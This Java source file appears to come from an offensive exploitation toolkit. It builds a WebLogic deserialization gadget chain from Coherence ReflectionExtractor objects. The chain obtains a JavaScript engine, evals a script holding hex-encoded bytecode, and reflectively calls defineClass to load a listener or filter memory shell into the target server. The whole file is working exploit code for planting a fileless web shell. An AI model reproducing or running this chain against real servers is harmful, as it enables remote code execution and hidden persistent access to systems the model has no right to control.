package utils.weblogic;

import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.tangosol.util.extractor.ReflectionExtractor;
import core.enumtypes.PayloadType;
import core.memshell.WeblogicFilterMemShell;
import core.memshell.WeblogicListenerMemShell;

import javassist.CtClass;
import utils.Util;

public class WeblogicGadget {

    public static ReflectionExtractor[] getReflectionExtractor(PayloadType type, String trojanType) throws Exception {
        byte[] bytecodes = null;
        CtClass clazz = null;
        switch (type){
            case weblogiclistenermemshell:
                clazz = Util.addSuperClass(WeblogicListenerMemShell.class, AbstractTranslet.class.getName());
                break;
            case weblogicfiltermemshell:
                clazz = Util.addSuperClass(WeblogicFilterMemShell.class, AbstractTranslet.class.getName());
                break;
        }
        clazz.replaceClassName(clazz.getName(), clazz.getName() +System.nanoTime());
        bytecodes =  clazz.toBytecode();
        clazz.defrost();
        String code = "var hex = '" + Util.bytesToHexString(bytecodes) + "';\n" +
                "hex = hex.length() % 2 != 0 ? \"0\" + hex : hex;\n" +
                "var b = new java.io.ByteArrayOutputStream();\n" +
                "for (var i = 0; i < hex.length() / 2; i++) {\n" +
                "   var index = i * 2;\n" +
                "   var v = java.lang.Integer.parseInt(hex.substring(index, index + 2), 16);\n" +
                "   b.write(v);\n" +
                "};\n" +
                "b.close();   \n" +
                "var bytes = b.toByteArray();   \n" +
                "var classLoader = java.lang.Thread.currentThread().getContextClassLoader();\n" +
                "var method = java.lang.ClassLoader.class.getDeclaredMethod('defineClass', ''.getBytes().getClass(), java.lang.Integer.TYPE, java.lang.Integer.TYPE);\n" +
                "method.setAccessible(true);\n" +
                "var clazz = method.invoke(classLoader, bytes, 0, bytes.length);\n" +
                "clazz.newInstance();\n";

        ReflectionExtractor extractor1 = new ReflectionExtractor(
                "getConstructor",
                new Object[]{new Class[0]}
        );

        ReflectionExtractor extractor2 = new ReflectionExtractor(
                "newInstance",
                new Object[]{new Object[0]}
        );

        ReflectionExtractor extractor3 = new ReflectionExtractor(
                "getEngineByName",
                new Object[]{"javascript"}
        );

        ReflectionExtractor extractor4 = new ReflectionExtractor(
                "eval",
                new Object[]{code}
        );

        ReflectionExtractor[] extractors = {
                extractor1,
                extractor2,
                extractor3,
                extractor4
        };
        return extractors;
    }
}
